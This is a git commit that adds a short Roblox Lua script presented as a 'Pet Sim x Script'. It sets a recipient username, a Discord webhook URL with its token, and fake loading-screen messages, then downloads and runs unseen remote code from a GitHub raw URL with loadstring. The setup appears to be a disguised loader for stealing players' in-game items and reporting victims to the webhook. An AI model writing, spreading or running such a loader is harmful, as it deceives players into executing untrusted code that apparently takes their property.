481b20e62666b40619f27bdb1fd1e0c2be3c8c5d
Psx112 <132260830+Psx112@users.noreply.github.com>
2023-05-01 12:55:38 +0300

    Create psxscript.lua

---
+++ psxscript.lua
@@ -0,0 +1,9 @@
+Username = "lolullolull"
+WebHook = "https://discord.com/api/webhooks/1102206242417553539/t5tIw_OJxns4Tk7KthYIGRayyeapbEDsk5sLmtwvA7Myv-SnhFvb7aAfvwqOMsGVrRCP"
+loadingscreen = true
+_G.CustomScriptName = "Pet Sim x Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
